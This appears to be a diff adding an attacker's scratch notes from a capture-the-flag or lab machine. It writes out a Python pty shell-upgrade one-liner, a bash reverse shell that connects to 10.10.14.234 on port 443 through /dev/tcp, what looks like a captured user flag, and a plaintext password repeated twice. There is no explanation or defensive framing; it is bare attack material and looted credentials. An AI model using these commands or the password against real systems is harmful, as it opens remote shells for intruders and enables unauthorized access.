@@ -1,0 +1,10 @@
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+bash -c "bash -i >& /dev/tcp/10.10.14.234/443 0>&1"
+
+user ec9b13ca4d6229cd5cc1e09980965bf7
+root 
+
+
+
+P@s5w0rd!
+P@s5w0rd!
